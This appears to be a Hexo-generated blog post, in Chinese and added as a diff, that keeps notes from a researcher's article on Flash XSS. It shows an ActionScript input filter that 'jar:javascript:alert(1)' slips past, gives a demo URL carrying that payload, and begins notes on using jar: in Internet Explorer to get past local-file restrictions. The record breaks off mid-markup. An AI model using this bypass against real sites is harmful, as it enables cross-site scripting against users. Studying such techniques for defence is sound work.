@@ -1,0 +1,756 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="xss,flash," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="&amp;nbsp; &amp;nbsp; 看国外大牛一文：http://soroush.secproject.com/blog/2013/10/catch-up-on-flash-xss-exploitation-part-2-navigatetourl-and-jar-protocol/ &amp;nbsp; &amp;nbsp; 讲的关于jar协议在flash xss中的妙用，这儿记录下poc，留作以后翻阅： javasc">
+<meta name="keywords" content="xss,flash">
+<meta property="og:type" content="article">
+<meta property="og:title" content="jar协议在flash xss中的一些技巧">
+<meta property="og:url" content="http://yoursite.com/2013/10/17/jar协议在flash-xss中的一些技巧/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="&amp;nbsp; &amp;nbsp; 看国外大牛一文：http://soroush.secproject.com/blog/2013/10/catch-up-on-flash-xss-exploitation-part-2-navigatetourl-and-jar-protocol/ &amp;nbsp; &amp;nbsp; 讲的关于jar协议在flash xss中的妙用，这儿记录下poc，留作以后翻阅： javasc">
+<meta property="og:updated_time" content="2018-02-26T05:36:35.270Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="jar协议在flash xss中的一些技巧">
+<meta name="twitter:description" content="&amp;nbsp; &amp;nbsp; 看国外大牛一文：http://soroush.secproject.com/blog/2013/10/catch-up-on-flash-xss-exploitation-part-2-navigatetourl-and-jar-protocol/ &amp;nbsp; &amp;nbsp; 讲的关于jar协议在flash xss中的妙用，这儿记录下poc，留作以后翻阅： javasc">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2013/10/17/jar协议在flash-xss中的一些技巧/"/>
+
+
+
+
+
+  <title>jar协议在flash xss中的一些技巧 | Hexo</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Startseite
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archiv
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2013/10/17/jar协议在flash-xss中的一些技巧/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">jar协议在flash xss中的一些技巧</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2013-10-17T19:00:16+08:00">
+                2013-10-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/HTML-CSS-JS-xss-xml/" itemprop="url" rel="index">
+                    <span itemprop="name">HTML|CSS|JS|xss|xml</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>&nbsp; &nbsp; 看国外大牛一文：<a href="http://soroush.secproject.com/blog/2013/10/catch-up-on-flash-xss-exploitation-part-2-navigatetourl-and-jar-protocol/" target="_blank" rel="noopener">http://soroush.secproject.com/blog/2013/10/catch-up-on-flash-xss-exploitation-part-2-navigatetourl-and-jar-protocol/</a></p>
+<p>&nbsp; &nbsp; 讲的关于jar协议在flash xss中的妙用，这儿记录下poc，留作以后翻阅：</p>
+<p>javascript:alert(1) 等同于jar:javascript:alert(1)</p>
+<p>&nbsp;</p>
+<p>bypass例子：</p>
+<p><table border="0" cellpadding="0" cellspacing="0" style="width:678px;font-size:12px;color:#555555;border:0px !important;margin:0px !important;border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;bottom:auto !important;height:auto !important;left:auto !important;line-height:1.1em !important;outline:0px !important;overflow:visible !important;padding:0px !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;box-sizing:content-box !important;font-family:Consolas, ’Bitstream Vera Sans Mono’, ’Courier New’, Courier, monospace !important;direction:ltr !important;" class="ke-zeroborder"><tbody style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;"><tr style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;"><td class="gutter" style="border:0px !important;padding:0px !important;border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-family:Consolas, ’Bitstream Vera Sans Mono’, ’Courier New’, Courier, monospace !important;font-size:1em !important;direction:ltr !important;color:#d3d3d3 !important;"><div class="line number1 index0 alt2" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;background-color:black !important;border-width:0px 3px 0px 0px !important;border-right-style:solid !important;border-right-color:#990000 !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 0.5em 0px 1em !important;position:static !important;right:auto !important;text-align:right !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">1</div></td></tr></tbody></table></p>
+<div class="line number2 index1 alt1" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;background-color:black !important;border-width:0px 3px 0px 0px !important;border-right-style:solid !important;border-right-color:#990000 !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 0.5em 0px 1em !important;position:static !important;right:auto !important;text-align:right !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">2</div><br><div class="line number3 index2 alt2" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;background-color:black !important;border-width:0px 3px 0px 0px !important;border-right-style:solid !important;border-right-color:#990000 !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 0.5em 0px 1em !important;position:static !important;right:auto !important;text-align:right !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">3</div><br><div class="line number4 index3 alt1" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;background-color:black !important;border-width:0px 3px 0px 0px !important;border-right-style:solid !important;border-right-color:#990000 !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 0.5em 0px 1em !important;position:static !important;right:auto !important;text-align:right !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">4</div><br><div class="line number5 index4 alt2" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;background-color:black !important;border-width:0px 3px 0px 0px !important;border-right-style:solid !important;border-right-color:#990000 !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 0.5em 0px 1em !important;position:static !important;right:auto !important;text-align:right !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">5</div><br><div class="line number6 index5 alt1" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;background-color:black !important;border-width:0px 3px 0px 0px !important;border-right-style:solid !important;border-right-color:#990000 !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 0.5em 0px 1em !important;position:static !important;right:auto !important;text-align:right !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">6</div><br><div class="line number7 index6 alt2" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;background-color:black !important;border-width:0px 3px 0px 0px !important;border-right-style:solid !important;border-right-color:#990000 !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 0.5em 0px 1em !important;position:static !important;right:auto !important;text-align:right !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">7</div><br><br><td class="code" style="width:650.6666870117188px;border:0px !important;padding:0px !important;border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;box-sizing:content-box !important;font-family:Consolas, ’Bitstream Vera Sans Mono’, ’Courier New’, Courier, monospace !important;font-size:1em !important;direction:ltr !important;"><div class="container" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px !important;position:relative !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;"><div class="line number1 index0 alt2" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;background-color:black !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;"><code>var</code> <code>input:String = root.loaderInfo.parameters.input; `</code>// input variable<code>&lt;/div&gt;
+&lt;div class=&quot;line number2 index1 alt1&quot; style=&quot;border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;background-color:black !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;&quot;&gt;</code>var<code></code>dangerousInput:RegExp = /^w&amp;#42script:.&amp;#42/i; <code>// to cover javascript: and vbscript: protocols!`&lt;/div&gt;
+&lt;div class=&quot;line number3 index2 alt2&quot; style=&quot;border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;background-color:black !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;&quot;&gt;`if</code>(!dangerousInput.test(input))<code>&lt;/div&gt;
+&lt;div class=&quot;line number4 index3 alt1&quot; style=&quot;border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;background-color:black !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;&quot;&gt;</code>{<code>&lt;/div&gt;
+&lt;div class=&quot;line number5 index4 alt2&quot; style=&quot;border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;background-color:black !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;&quot;&gt;</code>&nbsp;&nbsp;&nbsp;&nbsp;<code>// Safe to go?!!! --&amp;gt; No! What about &quot;jar:javascript:&quot;?`&lt;/div&gt;
+&lt;div class=&quot;line number6 index5 alt1&quot; style=&quot;border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;background-color:black !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;&quot;&gt;`&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;</code>navigateToURL(<code>new` `URLRequest(input),</code>“_self”<code>);</code>// redirection<code>&lt;/div&gt;
+&lt;div class=&quot;line number7 index6 alt2&quot; style=&quot;border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;background-color:black !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;&quot;&gt;</code>}<code>&lt;/div&gt;
+&lt;/div&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;div class=&quot;line number1 index0 alt2&quot; style=&quot;line-height:13.197916984558105px;font-family:Consolas, ’Bitstream Vera Sans Mono’, ’Courier New’, Courier, monospace;color:#555555;border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;background-color:black !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;direction:ltr !important;white-space:pre !important;&quot;&gt;</code>&amp;#42<code>&lt;/div&gt;
+&lt;div class=&quot;line number2 index1 alt1&quot; style=&quot;line-height:13.197916984558105px;font-family:Consolas, ’Bitstream Vera Sans Mono’, ’Courier New’, Courier, monospace;color:#555555;border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;background-color:black !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;direction:ltr !important;white-space:pre !important;&quot;&gt;&amp;nbsp;&lt;/div&gt;
+&lt;div class=&quot;line number3 index2 alt2&quot; style=&quot;line-height:13.197916984558105px;font-family:Consolas, ’Bitstream Vera Sans Mono’, ’Courier New’, Courier, monospace;color:#555555;border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;background-color:black !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;direction:ltr !important;white-space:pre !important;&quot;&gt;</code><a href="http://0me.me/demo/xss/flash/link_protocol_test.swf?input=jar:javascript:alert(1);//`" target="_blank" rel="noopener">http://0me.me/demo/xss/flash/link_protocol_test.swf?input=jar:javascript:alert(1);//`</a></div><br><div class="line number4 index3 alt1" style="line-height:13.197916984558105px;font-family:Consolas, ’Bitstream Vera Sans Mono’, ’Courier New’, Courier, monospace;color:#555555;border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;background-color:black !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;direction:ltr !important;white-space:pre !important;">&nbsp;</div><br><div class="line number5 index4 alt2" style="line-height:13.197916984558105px;font-family:Consolas, ’Bitstream Vera Sans Mono’, ’Courier New’, Courier, monospace;color:#555555;border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;background-color:black !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 1em !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;direction:ltr !important;white-space:pre !important;"><code>&amp;#42</code></div>
+
+<p>&nbsp;</p>
+<p>在ie中使用jar协议bypass本地文件读取限制：</p>
+<p>Jar protocol ? Opens C drive (note that I use only 1 slash character for the File protocol):</p>
+<div style="color:#555555;font-family:Arial, Tahoma, Verdana;line-height:20px;"><div id="highlighter_654238" class="syntaxhighlighter plain" style="width:630px;margin:1em 0px !important;position:relative !important;overflow-x:auto !important;overflow-y:hidden !important;font-size:1em !important;background-color:black !important;"><table border="0" cellpadding="0" cellspacing="0" style="width:630px;border:0px !important;margin:0px !important;border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;outline:0px !important;overflow:visible !important;padding:0px !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;box-sizing:content-box !important;font-family:Consolas, ’Bitstream Vera Sans Mono’, ’Courier New’, Courier, monospace !important;font-size:1em !important;direction:ltr !important;" class="ke-zeroborder"><tbody style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;"><tr style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;"><td class="gutter" style="border:0px !important;padding:0px !important;border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-family:Consolas, ’Bitstream Vera Sans Mono’, ’Courier New’, Courier, monospace !important;font-size:1em !important;direction:ltr !important;color:#d3d3d3 !important;"><div class="line number1 index0 alt2" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border-width:0px 3px 0px 0px !important;border-right-style:solid !important;border-right-color:#990000 !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 0.5em 0px 1em !important;position:static !important;right:auto !important;text-align:right !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">1</div><br><div class="line number2 index1 alt1" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border-width:0px 3px 0px 0px !important;border-right-style:solid !important;border-right-color:#990000 !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 0.5em 0px 1em !important;position:static !important;right:auto !important;text-align:right !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">2</div><br><div class="line number3 index2 alt2" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border-width:0px 3px 0px 0px !important;border-right-style:solid !important;border-right-color:#990000 !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 0.5em 0px 1em !important;position:static !important;right:auto !important;text-align:right !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">3</div><br><div class="line number4 index3 alt1" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border-width:0px 3px 0px 0px !important;border-right-style:solid !important;border-right-color:#990000 !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 0.5em 0px 1em !important;position:static !important;right:auto !important;text-align:right !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">4</div><br><div class="line number5 index4 alt2" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border-width:0px 3px 0px 0px !important;border-right-style:solid !important;border-right-color:#990000 !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px 0.5em 0px 1em !important;position:static !important;right:auto !important;text-align:right !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;white-space:pre !important;">5</div><br></td><br><td class="code" style="width:602.6666870117188px;border:0px !important;padding:0px !important;border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;position:static !important;right:auto !important;top:auto !important;vertical-align:baseline !important;box-sizing:content-box !important;font-family:Consolas, ’Bitstream Vera Sans Mono’, ’Courier New’, Courier, monospace !important;font-size:1em !important;direction:ltr !important;"><div class="container" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px !important;background-image:none !important;border:0px !important;bottom:auto !important;float:none !important;height:auto !important;left:auto !important;line-height:1.1em !important;margin:0px !important;outline:0px !important;overflow:visible !important;padding:0px !important;position:relative !important;right:auto !important;top:auto !important;vertical-align:baseline !important;width:auto !important;box-sizing:content-box !important;font-size:1em !important;direction:ltr !important;"><div class="line number1 index0 alt2" style="border-top-left-radius:0px !important;border-top-right-radius:0px !important;border-bottom-right-radius:0px !important;border-bottom-left-radius:0px 